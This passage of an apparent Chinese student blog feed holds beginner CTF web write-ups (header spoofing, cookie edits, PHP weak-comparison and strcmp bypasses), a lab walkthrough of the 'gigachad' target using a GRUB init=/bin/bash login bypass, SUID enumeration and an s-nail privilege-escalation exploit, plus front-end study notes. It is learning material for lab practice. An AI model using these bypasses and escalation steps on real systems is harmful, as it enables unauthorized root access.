id="6-攻防世界-Web新手区-get-post"><a href="#6-攻防世界-Web新手区-get-post" class="headerlink" title="6.攻防世界-Web新手区-get_post"></a>6.攻防世界-Web新手区-get_post</h4><p>检查页面 要求你通过GET方式提交a=1<br>提交后又叫你通过POST方式提交b=2<br>照做即可 获得flag<br><img data-src="/2024/03/12/CTF%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B32/6.jpg" alt="6"></p><h4 id="7-BugKu-Web-程序员本地网站"><a href="#7-BugKu-Web-程序员本地网站" class="headerlink" title="7.BugKu-Web-程序员本地网站"></a>7.BugKu-Web-程序员本地网站</h4><p>检查页面 页面显示<code>请以本地ip访问</code><br>使用burpsuite监听该网页 并将X-Forwarded-For标头改为127.0.0.1<br>获得flag<br><img data-src="/2024/03/12/CTF%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B32/7.jpg" alt="7"></p><h4 id="8-BugKu-Web-你从哪里来"><a href="#8-BugKu-Web-你从哪里来" class="headerlink" title="8.BugKu-Web-你从哪里来"></a>8.BugKu-Web-你从哪里来</h4><p>检查页面 页面显示<code>are you from google？</code><br>判定与referer标头有关 通过burpsuite监听页面<br>将referer标头改为<code>http://www.google.com</code><br>获得flag<br><img data-src="/2024/03/12/CTF%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B32/8.jpg" alt="8"></p><h4 id="9-攻防世界-Web新手区-xff-referrer"><a href="#9-攻防世界-Web新手区-xff-referrer" class="headerlink" title="9.攻防世界-Web新手区-xff_referrer"></a>9.攻防世界-Web新手区-xff_referrer</h4><p>检查页面 页面显示<code>ip必须为123.123.123</code><br>使用burpsuite监听该网页 并将X-Forwarded-For标头改为123.123.123.123<br>页面变为“必须来自<code>https://www.google.com</code>”<br>通过burpsuite监听页面 将referer标头改为<code>http://www.google.com</code><br>获得flag<br><img data-src="/2024/03/12/CTF%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B32/9.jpg" alt="9"></p><h4 id="10-攻防世界-Web新手区-cookie"><a href="#10-攻防世界-Web新手区-cookie" class="headerlink" title="10.攻防世界-Web新手区-cookie"></a>10.攻防世界-Web新手区-cookie</h4><p>检查页面 页面显示“你知道什么是cookie吗？”<br>f12-网络 查看页面cookie 发现信息<code>look here=cookie.php</code><br>于是访问cookie.php 发现信息 <strong>see the http response</strong><br>查看标头 获得flag<br><img data-src="/2024/03/12/CTF%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B32/10.jpg" alt="10"></p></body></html>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;CTF实战相关2&quot;&gt;&lt;a href=&quot;#CTF实战相关2&quot; class=&quot;headerlink&quot; title=&quot;CTF实战相关2&quot;&gt;&lt;/a&gt;CTF实战相关2&lt;/h1&gt;&lt;p&gt;以web类的CTF作为范本的话&lt;br&gt;应该做的&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;1.检查网页元素  寻找相关提示&lt;br&gt;2.通过网络查看http标头(header)&lt;br&gt;3.burp扫描&amp;#x2F;hackbar投送信息&amp;#x2F;更改cookie&lt;br&gt;4.php相关知识&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;还有标头会传达的 可更改的两个信息 X-Forwarded-For 与 Referer&lt;br&gt;简单来说&lt;br&gt;X-Forwarded-For表示访问该网址的ip 例如127.0.0.1即为本地访问&lt;br&gt;Referer代表了你是从哪个网页来——例如&lt;code&gt;http://www.google.com&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&quot;例题&quot;&gt;&lt;a href=&quot;#例题&quot; class=&quot;headerlink&quot; title=&quot;例题&quot;&gt;&lt;/a&gt;例题&lt;/h2&gt;&lt;p&gt;（注：这里图片只附上结果 主要是不想再开环境了）&lt;br&gt;使用了谷歌浏览器的f12功能 burpsuite 与 firefox的hackbar插件&lt;/p&gt;</summary>
    
    
    
    <category term="学习" scheme="https://www.maonie.top/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="CTF" scheme="https://www.maonie.top/categories/%E5%AD%A6%E4%B9%A0/CTF/"/>
    
    
    <category term="学习" scheme="https://www.maonie.top/tags/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="CTF" scheme="https://www.maonie.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>靶机解析-gigachad</title>
    <link href="https://www.maonie.top/2024/03/09/%E9%9D%B6%E6%9C%BA%E8%A7%A3%E6%9E%90-gigachad/"/>
    <id>https://www.maonie.top/2024/03/09/%E9%9D%B6%E6%9C%BA%E8%A7%A3%E6%9E%90-gigachad/</id>
    <published>2024-03-09T05:55:38.000Z</published>
    <updated>2024-03-10T07:26:46.478Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p>这周的靶机</p><h1 id="环境设置"><a href="#环境设置" class="headerlink" title="环境设置"></a>环境设置</h1><p>攻击机：kali<br>靶机：gigachad</p><h2 id="相关知识-工具"><a href="#相关知识-工具" class="headerlink" title="相关知识-工具"></a>相关知识-工具</h2><p>linux单次登录/更改ip设置<br>提权技巧<br>searchsploit</p><h1 id="具体过程"><a href="#具体过程" class="headerlink" title="具体过程"></a>具体过程</h1><p>首先 我们打开两个机子</p><span id="more"></span><p>发现同网段扫不到靶机 检查了vmware的设置依旧没有问题<br>那就去靶机那里看看网络设置<br>需要账号密码登录 但我们可以通过更改启动选项来登录<br><img data-src="/2024/03/09/%E9%9D%B6%E6%9C%BA%E8%A7%A3%E6%9E%90-gigachad/2.jpg" alt="1"><br>在开机的这个页面按下e键 进入编辑模式<br>用方向键翻到Linux那行 再按右键一直到该行的末尾 将<code>ro quiet</code>改为<code>rw single init=/bin/bash</code></p><blockquote><p>rw 代表read write，读写模式。<br>signie init= 代表启动系统后自动运行的程序。<br>/bin/bash 是系统shell的位置。</p></blockquote><p><img data-src="/2024/03/09/%E9%9D%B6%E6%9C%BA%E8%A7%A3%E6%9E%90-gigachad/1.jpg" alt="1"><br>更改完毕后按下ctrl+x来保存 随后你会发现你成功登陆了 按enter来在加载时提前输入命令<br>在linux内挑出了shell后 为了排查扫不到的原因 先执行<code>ip a</code>检查一下<br><img data-src="/2024/03/09/%E9%9D%B6%E6%9C%BA%E8%A7%A3%E6%9E%90-gigachad/3.jpg" alt="3"><br>看来是网卡<code>ens33</code>没有自动分配到ip地址<br>看一下网络的配置 发现配置的网卡名是<code>enp0s3</code> 明显不对 将它改回<code>ens33</code><br><img data-src="/2024/03/09/%E9%9D%B6%E6%9C%BA%E8%A7%A3%E6%9E%90-gigachad/4.jpg" alt="4"></p><pre class="line-numbers language-none"><code class="language-none">cat /etc/network/interfaces //查看文件内容vi /etc/network/interfaces //编辑文件内容/etc/init.d/networking restart //重启网络<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>改完之后重启网络 通过<code>ip a</code>确认靶机已经联网<br><img data-src="/2024/03/09/%E9%9D%B6%E6%9C%BA%E8%A7%A3%E6%9E%90-gigachad/5.jpg" alt="5"><br><img data-src="/2024/03/09/%E9%9D%B6%E6%9C%BA%E8%A7%A3%E6%9E%90-gigachad/6.jpg" alt="6"><br>这里就可以看到靶机分到的ip了<br>重启靶机后直接在kali进行指定的nmap扫描<br><code>nmap -A -p- 'ip地址'  //-A指综合性扫描</code><br><img data-src="/2024/03/09/%E9%9D%B6%E6%9C%BA%E8%A7%A3%E6%9E%90-gigachad/7.jpg" alt="7"><br>http/80端口开着 ftp/21端口也开着 允许匿名登录 还有个叫chadinfo的文件<br>先从tcp入手<br><img data-src="/2024/03/09/%E9%9D%B6%E6%9C%BA%E8%A7%A3%E6%9E%90-gigachad/8.jpg" alt="8"></p><pre class="line-numbers language-none"><code class="language-none">ftp 'ip地址'  //尝试链接ftp服务lsget '文件名' //下载文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>获取了叫chadinfo的文件<br><img data-src="/2024/03/09/%E9%9D%B6%E6%9C%BA%E8%A7%A3%E6%9E%90-gigachad/9.jpg" alt="9"><br>解压之后有个txt文件<br>里边说用户名是 <strong>chad</strong>  密码请去/drippinchad.png里找<br>访问网站底下的这个目录<br><img data-src="/2024/03/09/%E9%9D%B6%E6%9C%BA%E8%A7%A3%E6%9E%90-gigachad/10.jpg" alt="10"><br>why yes,this is my favorite place to relax.how could you tell?<br>这个地的地名似乎就是密码 以图搜图一下<br><img data-src="/2024/03/09/%E9%9D%B6%E6%9C%BA%E8%A7%A3%E6%9E%90-gigachad/11.jpg" alt="11"><br>结论：叫做maiden‘s tower<br>尝试用chad与maiden’s tower的各种形式来登录ssh服务<br><img data-src="/2024/03/09/%E9%9D%B6%E6%9C%BA%E8%A7%A3%E6%9E%90-gigachad/12.jpg" alt="12"><br>用<code>maidenstower</code>成功登录<br><img data-src="/13.jpg" alt="13"><br>目录底下就有flag1<br>flag2多半是需要提权了</p><blockquote><p>拿到低权限的shell后经常做的几件事：<br>1、看系统发行版本 lsb_release -a<br>2、查看内核版本 uname -a<br>3、当前用户权限<br>4、列举suid文件 `find / -perm -u=f 2&gt;/dev/null<br>5、查看已经安装的包、运行的服务，过期版本可能会存在漏洞</p><p>find / -perm -u=s -type f -exec ls -la {} ; 2&gt;/dev/null<br>-perm 是代表按指定权限搜索。<br>-u=s 其中u代表当前用户的权限，s代表suid权限，-号代表至少需要满足指定的权限，可以有更多的权限，但是不能少了这个指定权限。关于这个参数更详细的内容可以参考：<a href="https://blog.csdn.net/weixin_44061169/article/details/105784760">https://blog.csdn.net/weixin_44061169/article/details/105784760</a><br>-tpye 代表搜索指定的类型，f代表文件。<br>-exec 代表搜索完后执行指定的命令，其中{}代表所搜到的结果，命令以;为结束标识。更详细内容可以参考：<a href="https://www.pianshen.com/article/86691137271/">https://www.pianshen.com/article/86691137271/</a><br>2&gt;/dev/null 代表将不显示错误信息</p><p>参考：<a href="https://blog.csdn.net/rpsate/article/details/119494515">https://blog.csdn.net/rpsate/article/details/119494515</a></p></blockquote><p><img data-src="/2024/03/09/%E9%9D%B6%E6%9C%BA%E8%A7%A3%E6%9E%90-gigachad/14.jpg" alt="14"><br>发现s-nail，尝试利用该程序提权<br><img data-src="/2024/03/09/%E9%9D%B6%E6%9C%BA%E8%A7%A3%E6%9E%90-gigachad/15.jpg" alt="15"><br>寻找漏洞<br><img data-src="/2024/03/09/%E9%9D%B6%E6%9C%BA%E8%A7%A3%E6%9E%90-gigachad/16.jpg" alt="16"><br>将提权文件复制进靶机<br><img data-src="/2024/03/09/%E9%9D%B6%E6%9C%BA%E8%A7%A3%E6%9E%90-gigachad/17.jpg" alt="17"><br><img data-src="/2024/03/09/%E9%9D%B6%E6%9C%BA%E8%A7%A3%E6%9E%90-gigachad/18.jpg" alt="18"><br>加权 运行 要多试几次 最后成功提权<br><img data-src="/2024/03/09/%E9%9D%B6%E6%9C%BA%E8%A7%A3%E6%9E%90-gigachad/19.jpg" alt="19"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>最近有点忙着备考就不写总结了<br>嘻嘻</p></body></html>]]></content>
    
    
    <summary type="html">&lt;p&gt;这周的靶机&lt;/p&gt;
&lt;h1 id=&quot;环境设置&quot;&gt;&lt;a href=&quot;#环境设置&quot; class=&quot;headerlink&quot; title=&quot;环境设置&quot;&gt;&lt;/a&gt;环境设置&lt;/h1&gt;&lt;p&gt;攻击机：kali&lt;br&gt;靶机：gigachad&lt;/p&gt;
&lt;h2 id=&quot;相关知识-工具&quot;&gt;&lt;a href=&quot;#相关知识-工具&quot; class=&quot;headerlink&quot; title=&quot;相关知识-工具&quot;&gt;&lt;/a&gt;相关知识-工具&lt;/h2&gt;&lt;p&gt;linux单次登录&amp;#x2F;更改ip设置&lt;br&gt;提权技巧&lt;br&gt;searchsploit&lt;/p&gt;
&lt;h1 id=&quot;具体过程&quot;&gt;&lt;a href=&quot;#具体过程&quot; class=&quot;headerlink&quot; title=&quot;具体过程&quot;&gt;&lt;/a&gt;具体过程&lt;/h1&gt;&lt;p&gt;首先 我们打开两个机子&lt;/p&gt;</summary>
    
    
    
    <category term="学习" scheme="https://www.maonie.top/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="靶机解析" scheme="https://www.maonie.top/categories/%E5%AD%A6%E4%B9%A0/%E9%9D%B6%E6%9C%BA%E8%A7%A3%E6%9E%90/"/>
    
    
    <category term="学习" scheme="https://www.maonie.top/tags/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="靶机解析" scheme="https://www.maonie.top/tags/%E9%9D%B6%E6%9C%BA%E8%A7%A3%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>ctf实战相关1</title>
    <link href="https://www.maonie.top/2024/03/06/ctf%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B31/"/>
    <id>https://www.maonie.top/2024/03/06/ctf%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B31/</id>
    <published>2024-03-06T09:59:32.000Z</published>
    <updated>2024-03-06T12:51:21.599Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p>本次主题为 <strong>[ACTF2020 新生赛]BackupFile</strong> 与 <strong>[极客大挑战 2019]BuyFlag</strong></p><h2 id="使用平台"><a href="#使用平台" class="headerlink" title="使用平台"></a>使用平台</h2><p>chrome<br><a href="https://buuoj.cn/">buuctf</a><br>firefox(搭载hackbar)</p><h2 id="相关知识"><a href="#相关知识" class="headerlink" title="相关知识"></a>相关知识</h2><p>备份文件的存在<br>cookie查看/修改<br>php数据类型</p><h2 id="flag获取过程"><a href="#flag获取过程" class="headerlink" title="flag获取过程"></a>flag获取过程</h2><span id="more"></span><p><strong>1.[ACTF2020 新生赛]BackupFile</strong><br><img data-src="/2024/03/06/ctf%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B31/1.jpg" alt="1"><br>总之 一进去 啥都没有<br>f12注释也没藏<br>我们换个思路 既然题目内容点了题 那么解题方案注定和backup file有关<br>多半只能扫目录了 于是用dirsearch和dirb搜索相关的目录<br>最后发现是潜藏在主页的.bak(每个页面都会有的备份页面)之中<br><img data-src="/2024/03/06/ctf%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B31/2.png" alt="2"><br>👆关于.bak文件的相关解释<br>目录后输入<code>/index.php.bak</code> 会为你自动下载一份文件 以记事本打开<br><img data-src="/2024/03/06/ctf%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B31/3.jpg" alt="3"><br>要我通过输入非纯数字的方式提交$str的内容在PHP中：<br>= = 为弱相等 即当整数和字符串类型相比较时 会先将字符串转化为整数然后再进行比较。比如a=123和b=123a45进行= =比较时。b只会截取前面的整数部分 被转化成123 因此只需要提供参数?key=123即可<br><img data-src="/2024/03/06/ctf%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B31/4.jpg" alt="4"><br>提交flag 结束!</p><p><strong>2.[极客大挑战 2019]BuyFlag</strong><br><img data-src="/2024/03/06/ctf%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B31/5.jpg" alt="5"><br>首先观察主页面 发现右侧菜单栏通往另一个与flag有关的分页面<br><img data-src="/2024/03/06/ctf%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B31/6.jpg" alt="6"><br>首先是线索<br>(如果想要购买flag 你必须得是CUIT的学生之一 还得回答正确的密码)<br>第一关是 <strong>通过CUIT的学生验证</strong><br>我们通过观察网站的网络数据包与cookie 发现一个名为 <strong>user</strong> 的cookie 值为0<br>尝试将0更改为1 成功通过<br><img data-src="/2024/03/06/ctf%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B31/7.jpg" alt="7"><br>第二关是 <strong>输入正确密码</strong><br><img data-src="/2024/03/06/ctf%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B31/8.jpg" alt="8"><br>这点网站的注释中有相关的代码透露<br>该代码内同样使用了 <strong>弱相等</strong>  需要通过post方式将 <strong>$password</strong> 改为会被整数化为404的字符 我们拟用 <strong>404a</strong> 进行尝试 成功通过<br><img data-src="/2024/03/06/ctf%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B31/9.jpg" alt="9"><br>进入了第三关 <strong>付钱</strong><br>注释中提到过 <strong>post money and password</strong><br>因此投送的数据名应为money<br><img data-src="/2024/03/06/ctf%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B31/10.jpg" alt="10"><br>输入了所需要的100000000元后 却显示数据过长 需要压缩<br>这里有两种方式<br>(1)输入简略的科学计数法 如1e9=1×10的9次方 来使字符压缩<br>(2)利用strcmp函数在判断对象不是字符串时会报错并return0 的特性<br>输入money[]=1 使money变为数组 获取flag<br><img data-src="/2024/03/06/ctf%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B31/11.jpg" alt="11"><br>提交flag 结束!</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>更感觉CTF是一种不同形式的靶机<br>总之我们下次见吧</p></body></html>]]></content>
    
    
    <summary type="html">&lt;p&gt;本次主题为 &lt;strong&gt;[ACTF2020 新生赛]BackupFile&lt;/strong&gt; 与 &lt;strong&gt;[极客大挑战 2019]BuyFlag&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&quot;使用平台&quot;&gt;&lt;a href=&quot;#使用平台&quot; class=&quot;headerlink&quot; title=&quot;使用平台&quot;&gt;&lt;/a&gt;使用平台&lt;/h2&gt;&lt;p&gt;chrome&lt;br&gt;&lt;a href=&quot;https://buuoj.cn/&quot;&gt;buuctf&lt;/a&gt;&lt;br&gt;firefox(搭载hackbar)&lt;/p&gt;
&lt;h2 id=&quot;相关知识&quot;&gt;&lt;a href=&quot;#相关知识&quot; class=&quot;headerlink&quot; title=&quot;相关知识&quot;&gt;&lt;/a&gt;相关知识&lt;/h2&gt;&lt;p&gt;备份文件的存在&lt;br&gt;cookie查看&amp;#x2F;修改&lt;br&gt;php数据类型&lt;/p&gt;
&lt;h2 id=&quot;flag获取过程&quot;&gt;&lt;a href=&quot;#flag获取过程&quot; class=&quot;headerlink&quot; title=&quot;flag获取过程&quot;&gt;&lt;/a&gt;flag获取过程&lt;/h2&gt;</summary>
    
    
    
    <category term="学习" scheme="https://www.maonie.top/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="CTF" scheme="https://www.maonie.top/categories/%E5%AD%A6%E4%B9%A0/CTF/"/>
    
    
    <category term="学习" scheme="https://www.maonie.top/tags/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="CTF" scheme="https://www.maonie.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>复习time</title>
    <link href="https://www.maonie.top/2024/02/27/%E5%A4%8D%E4%B9%A0time/"/>
    <id>https://www.maonie.top/2024/02/27/%E5%A4%8D%E4%B9%A0time/</id>
    <published>2024-02-27T10:25:52.000Z</published>
    <updated>2024-02-27T11:29:03.067Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><h1 id="高三了进行一个前端（html-css-javascript）的复习"><a href="#高三了进行一个前端（html-css-javascript）的复习" class="headerlink" title="高三了进行一个前端（html+css+javascript）的复习"></a>高三了进行一个前端（html+css+javascript）的复习</h1><h2 id="html"><a href="#html" class="headerlink" title="html"></a>html</h2><blockquote><p>“超文本标记语言（英语：HyperText Markup Language，简称：HTML）是一种用于创建网页的标准标记语言。<br>您可以使用 HTML 来建立自己的 WEB 站点，HTML 运行在浏览器上，由浏览器来解析。”</p></blockquote><p><strong>基础构造</strong></p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">doctype</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>元素名用尖括号包裹<br> 以<code>&lt;元素名&gt;元素内容&lt;/元素名&gt;</code>或<code>&lt;元素名 /&gt;</code>作为一部分组成的代码<br>注释形式为<code>&lt;!--这是一个注释，注释在浏览器中不会显示--&gt;</code></p><h2 id="css"><a href="#css" class="headerlink" title="css"></a>css</h2><blockquote><p>“<strong>CSS</strong> (Cascading Style Sheets，层叠样式表），是一种用来为结构化文档（如 HTML 文档或 XML 应用）添加样式（字体、间距和颜色等）的计算机语言，<strong>CSS</strong> 文件扩展名为 <strong>.css</strong>。<br>通过使用 <strong>CSS</strong> 我们可以大大提升网页开发的工作效率！”</p></blockquote><span id="more"></span><p><strong>基础构造</strong></p><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">body</span> <span class="token punctuation">{</span>    <span class="token property">background-color</span><span class="token punctuation">:</span>#d0e4fe<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector">h1</span> <span class="token punctuation">{</span>    <span class="token property">color</span><span class="token punctuation">:</span>orange<span class="token punctuation">;</span>    <span class="token property">text-align</span><span class="token punctuation">:</span>center<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector">p</span> <span class="token punctuation">{</span>    <span class="token property">font-family</span><span class="token punctuation">:</span><span class="token string">"Times New Roman"</span><span class="token punctuation">;</span>    <span class="token property">font-size</span><span class="token punctuation">:</span>20px<span class="token punctuation">;</span><span class="token punctuation">}</span>👆在html中直接编译可以使用&lt;style&gt;标签又或者使用 &lt;link rel=<span class="token string">"stylesheet"</span> href=<span class="token string">"style.css"</span>&gt;这样便可以多个网页复用一个css文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>首先声明需要更改的元素 （例如body）<br>然后用大括号 里面加上属性 随后加冒号 声明属性的值 随后以分号收尾<br>除了直接更改元素 还可以使用选择器</p><pre class="line-numbers language-css+html" data-language="css+html"><code class="language-css+html">#para1{text-align:center;color:red;} 👆CSS 中id 选择器以 "#" 来定义&lt;p id="para1"&gt;Hello World!&lt;/p&gt;👆这个段落就会受到居中和红色字体的影响<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">.center</span><span class="token punctuation">{</span><span class="token property">text-align</span><span class="token punctuation">:</span>center<span class="token punctuation">;</span><span class="token punctuation">}</span>👆在 CSS 中类选择器以一个点.号显示&lt;h1 class=<span class="token string">"center"</span>&gt;标题居中&lt;/h1&gt;&lt;p class=<span class="token string">"center"</span>&gt;段落居中。&lt;/p&gt; 👆这些元素就会受到居中影响<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">p.center</span><span class="token punctuation">{</span><span class="token property">text-align</span><span class="token punctuation">:</span>center<span class="token punctuation">;</span><span class="token punctuation">}</span>👆在.号前加上元素名 就能限制选择器的范围&lt;h1 class=<span class="token string">"center"</span>&gt;这个标题不受影响&lt;/h1&gt;&lt;p class=<span class="token string">"center"</span>&gt;这个段落居中对齐。&lt;/p&gt; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注释方式是<code>/*这里是注释的内容*/</code></p><h2 id="javascript"><a href="#javascript" class="headerlink" title="javascript"></a>javascript</h2><p>还在自学 打点草稿上来 1.javascript对大小写敏感<br>2.输出方式很多<br>(1)浏览器的f12 - 控制台中测试<br>(2)html文件<code>&lt;script&gt;</code>元素之间</p><p>总之先把现在懂的代码列出来吧<br>(1)var 变量名=’变量内容’ //定义变量<br>(2)字符需要加“”或者’‘ 不然被看做变量<br>(3)console.log(“这些文字”) //让该网页的控制台中输出这些文字<br>(4)<code>单行注释 //</code><br>(5)<code>/*多行注释*/</code><br>(6)申明函数（类似于python）<br>    function 函数名称（可选的变量项1，变量项2）{<br>    代码内容<br>    }<br>(7) return x; 输出变量x的值 多用于函数结尾<br>(8) 加在元素的标签内 例如下文中的onclick 点击后通过替换demo中的内容来实现报时<br><code>&lt;button onclick="getElementById('demo').innerHTML=Date()"&gt;现在的时间是?&lt;/button&gt;</code><br><code>&lt;p id="demo"&gt;&lt;/p&gt;</code><br><a href="https://www.runoob.com/jsref/dom-obj-event.html">https://www.runoob.com/jsref/dom-obj-event.html</a><br>至于事件可以看这里👆</p><p>(9)至于元素和.后边的相互关系目前未知<br>(10)输出方式很多<br>使用document.write()将内容写入到html中<br>使用console.log()在f12里的console生成信息<br>使用window.alert()弹出警告框<br>用id属性标识某个元素 然后使用document.getElementById(“demo”).innerHTML=”想要加入的内容”<br><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Element/innerHTML">https://developer.mozilla.org/zh-CN/docs/Web/API/Element/innerHTML</a><br>很酷<br>vue.js<br>(11)变量在赋值之前都是undefined</p></body></html>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;高三了进行一个前端（html-css-javascript）的复习&quot;&gt;&lt;a href=&quot;#高三了进行一个前端（html-css-javascript）的复习&quot; class=&quot;headerlink&quot; title=&quot;高三了进行一个前端（html+css+javascript）的复习&quot;&gt;&lt;/a&gt;高三了进行一个前端（html+css+javascript）的复习&lt;/h1&gt;&lt;h2 id=&quot;html&quot;&gt;&lt;a href=&quot;#html&quot; class=&quot;headerlink&quot; title=&quot;html&quot;&gt;&lt;/a&gt;html&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;“超文本标记语言（英语：HyperText Markup Language，简称：HTML）是一种用于创建网页的标准标记语言。&lt;br&gt;您可以使用 HTML 来建立自己的 WEB 站点，HTML 运行在浏览器上，由浏览器来解析。”&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;基础构造&lt;/strong&gt;&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-markup&quot; data-language=&quot;markup&quot;&gt;&lt;code class=&quot;language-markup&quot;&gt;&lt;span class=&quot;token doctype&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;!&lt;/span&gt;&lt;span class=&quot;token doctype-tag&quot;&gt;doctype&lt;/span&gt; &lt;span class=&quot;token name&quot;&gt;html&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;html&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
    &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;head&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
    &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;head&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
    	&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;body&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
    	&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;body&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;html&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
